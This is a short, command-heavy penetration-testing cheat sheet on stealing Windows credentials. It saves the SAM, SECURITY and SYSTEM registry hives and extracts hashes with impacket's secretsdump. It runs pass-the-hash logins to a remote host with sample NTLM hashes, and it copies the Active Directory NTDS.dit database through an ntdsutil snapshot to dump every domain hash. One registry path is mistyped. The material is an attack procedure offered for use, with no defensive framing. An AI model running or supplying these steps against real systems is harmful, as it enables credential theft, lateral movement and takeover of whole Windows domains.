Dumping Windows Creds
=====================

On windows side
C:\> reg.exe save hklm\sam C:\tmp\sam.save
C:\> reg.exe save hklm\security C:\tmp\security.save
C:\> reg.exe save hklm\system C:\tmp\system.save

Get the files back to your box.  By whatever means necessary... (Windows Powershell webserver anyone?)

On Kali: (Secretsdump.py part of impacket)
# secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Pass the Hash:
pth-net rpc user -U 'name\john-pc$%1as7dsa7d8d2gasassadadad62d2
pth-winexe -U domain/<username>%aad3b435b51404eeaad3b435b51404ee:12f73e24dc92b2e73aad3c2567edb754 //172.27.130.49 cmd.exe

Dumping Domain Creds off Active Directory:
==========================================

Also uses impacket, skip if already installed:
pip install pyasn1
pip install impacket

secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>


OR Manual Approach:
------------------
    Run cmd.exe as Administrator on the domain controller.
    Run ntdsutil and type the following commands:

snapshot
activate instance NTDS
create

    This will create a snapshot and show you the UUID of the newly created snapshot. ntdsutil is using Volume Shadow Copy for the snapshot creation, but also ensures the database consistency. Use the UUID for the following command:

mount <UUID>

    The output will show the path where the snapshot was mounted. Start another cmd.exe as Administrator and copy NTDS.dit (located in Windows\NTDS\NTDS.dit by default).
    Create a copy of the SYSTEM registry hive:

reg.exe save HLKM/SYSTEM <path_where_you_want_to_save_it>

    Go back to the cmd.exe window with ntdsutil running, and unmount (and optionally delete) the snapshot and exit:

unmount <UUID>
delete <UUID>
quit
quit

    Using the two saved files (NTDS.dit and SYSTEM registry hive) you can use the same secretsdump.py script to extract password hashes offline (doesn’t need to be done on the domain controller):

secretsdump.py -system <path_to_system_hive> -ntds <path_to_ntds.dit> LOCAL
